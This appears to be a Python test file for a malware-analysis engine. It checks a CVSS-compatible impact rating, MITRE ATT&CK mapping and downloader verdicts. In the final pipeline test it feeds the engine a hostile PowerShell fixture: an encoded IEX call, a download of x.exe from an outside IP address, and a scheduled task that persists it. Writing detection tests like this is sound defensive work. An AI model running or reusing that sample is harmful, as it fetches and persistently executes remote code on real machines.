"""The Cyclowareness Impact Rating, the internal multi-engine verdict, and MITRE ATT&CK mapping."""
from __future__ import annotations

from app.engine import impact, mitre, pipeline, storage, verdict
from app.engine.contracts import IOCs, Signal


# These are the CVSS v3.1 specification's own worked vectors, checked against the
# FIRST.org calculator. The rating is no longer *called* CVSS — malware is not a
# vulnerability — but the arithmetic is deliberately CVSS-compatible so that a
# CIR 8.8 means to an analyst what an 8.8 has always meant, and so the number is
# reproducible by anyone holding the published equations. If any of these drifts,
# the maths has been degraded and the scale no longer means what we say it means.
def test_impact_reproduces_cvss_arithmetic():
    cases = [
        ({"AV": "N", "AC": "L", "PR": "N", "UI": "N", "S": "U", "C": "H", "I": "H", "A": "H"}, 9.8),
        ({"AV": "N", "AC": "L", "PR": "N", "UI": "R", "S": "U", "C": "H", "I": "H", "A": "H"}, 8.8),
        ({"AV": "L", "AC": "L", "PR": "N", "UI": "R", "S": "U", "C": "N", "I": "N", "A": "N"}, 0.0),
        ({"AV": "L", "AC": "L", "PR": "L", "UI": "N", "S": "U", "C": "H", "I": "H", "A": "H"}, 7.8),
        ({"AV": "N", "AC": "L", "PR": "N", "UI": "N", "S": "C", "C": "H", "I": "H", "A": "H"}, 10.0),
        ({"AV": "N", "AC": "H", "PR": "N", "UI": "N", "S": "U", "C": "L", "I": "L", "A": "N"}, 4.8),
        ({"AV": "L", "AC": "L", "PR": "N", "UI": "R", "S": "C", "C": "H", "I": "H", "A": "H"}, 8.6),
    ]
    for metrics, expected in cases:
        assert impact.score(metrics) == expected, metrics


def test_impact_severity_bands():
    assert impact.severity_of(0.0) == "none"
    assert impact.severity_of(3.9) == "low"
    assert impact.severity_of(6.9) == "medium"
    assert impact.severity_of(8.9) == "high"
    assert impact.severity_of(9.0) == "critical"


def test_mitre_maps_powershell_downloader():
    signals = [
        Signal(id="script.encoded_command", title="Base64-encoded command", severity="high"),
        Signal(id="script.download_and_execute", title="Remote payload retrieval", severity="high"),
        Signal(id="script.dynamic_execution", title="Runtime code evaluation", severity="high"),
    ]
    techniques = {t["technique_id"] for t in mitre.map_techniques(signals)}
    assert "T1059.001" in techniques          # PowerShell
    assert "T1105" in techniques               # Ingress Tool Transfer
    assert "T1027" in techniques               # Obfuscation


def test_verdict_downloader_classification():
    signals = [
        Signal(id="script.download_and_execute", title="Remote payload retrieval", severity="high"),
        Signal(id="script.dynamic_execution", title="Runtime code evaluation", severity="high"),
    ]
    from app.engine.contracts import AnalyzerResult

    result = AnalyzerResult(analyzer="script", signals=signals, iocs=IOCs(urls=["http://x/y"]))
    v = verdict.classify("script", "text/x-powershell", [result], IOCs(urls=["http://x/y"]), 70.0)
    assert v.verdict == "malicious"
    assert v.platform == "PowerShell"
    assert v.category == "Downloader"
    assert v.detected >= 1


def test_pipeline_populates_real_results(db):
    ps = (
        b"$b='SQBFAFgA';IEX([Convert]::FromBase64String($b));"
        b"(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/x.exe','a.exe')\n"
        b"schtasks /create /tn U /tr a.exe /f\n"
    )
    stored = storage.store_bytes(ps)
    job = pipeline.new_job(db, stored, original_name="update.ps1")
    db.commit()
    pipeline.run(db, job)
    db.commit()

    assert job.verdict["verdict"] == "malicious"
    assert "PowerShell" in job.verdict["threat_name"]
    assert job.impact["base_score"] > 0
    assert job.impact["vector"].startswith("CIR:1.0/")
    assert any(t["technique_id"] == "T1105" for t in job.mitre)
